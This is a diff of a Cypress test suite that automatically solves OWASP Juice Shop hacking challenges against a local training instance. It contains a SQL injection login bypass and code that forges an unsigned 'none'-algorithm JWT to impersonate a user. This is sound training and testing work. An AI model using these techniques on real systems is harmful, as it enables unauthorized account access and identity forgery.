@@ -1,17 +1,17 @@
 import '../support/index';
 
-describe("Pwned JuiceShop", () => {
+const jwt = require('jsonwebtoken');
 
-  beforeEach(() => {
-    cy.visit('/')
-    .then(() => {
-      cy.get('.cc-btn').click();
-      cy.get('.close-dialog').click();
-    });
+describe("Pwned JuiceShop", () => {
+  
+  before(() => {
+    cy.setCookie('welcomebanner_status', 'dismiss');
+    cy.setCookie('cookieconsent_status', 'dismiss');
   });
   
-  after(() => {
-    cy.visit('/#/score-board');
+  beforeEach(() => {
+    // Keep the following cookies between each test
+    Cypress.Cookies.preserveOnce('welcomebanner_status', 'cookieconsent_status');
   });
   
   it("Find the carefully hidden ‘Score Board’ page.", () => {
@@ -54,15 +54,80 @@ describe("Pwned JuiceShop", () => {
   
   it("Log in with the administrator’s user account.", () => {
       
-    cy.visit('http://localhost:3000/#/login')
-    .then(() => {
+    cy.visit('http://localhost:3000/#/login').then(() => {
+        
+      // SQL Injection
       cy.get('#email').type("' or 1=1--");
       cy.get('#password').type("foo");
       cy.get('#loginButton').click();
+      
+      // check if challenge is solved
       cy.isSolvedChallenge('loginAdminChallenge').should('eq', true);
+      
+      // Logout
+      cy.get('#navbarAccount').click();
+      cy.get('#navbarLogoutButton > span').click();
+      
     });
+    
+
     
   });
   
+  it("Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op", () => {
+    
+    // Login with cypress account
+    cy.signin('cypress@mail.com','cypress');
+    
+    cy.getCookie('token').should('exist');
+    
+    // le cookie n'est pas encore setté par la webapp.
+    // il faudra récupérer le token depuis la reponse http
+    cy.getCookie('token').then((cookie) => {
+        
+         // Get Token
+         var token = jwt.decode(cookie.value, {complete: true});
+         expect(token.payload.data.email).to.equal('cypress@mail.com');
+         
+         // Forge an unsigned Token
+         token.payload.data.email = 'jwtn3d@juice-sh.op';
+         var unsignedToken = jwt.sign(token.payload,'nosecret',{ algorithm: 'none'});
+         
+         console.log(unsignedToken);
+         
+         // Forge POST request to create an admin user
+        const options = {
+          method: 'GET',
+          url: '/api/Products/1',
+          auth: {
+            bearer: unsignedToken
+          }
+        }
+    
+    
+        cy.request(options).then(() => {
+            
+            // check if challenge is solved
+            cy.isSolvedChallenge('jwtUnsignedChallenge').should('eq', true);
+            
+            // Logout
+            cy.visit('http://localhost:3000/#/login').then(() => {
+              cy.get('#navbarAccount').click();
+              cy.get('#navbarLogoutButton > span').click();
+            });
+            
+        });
+        
+      });
+      
+  });
+        
+        
+  
+  after(() => {
+//     cy.setCookie('welcomebanner_status', 'dismiss');
+//     cy.setCookie('cookieconsent_status', 'dismiss');
+    cy.visit('/#/score-board');
+  });
     
 });
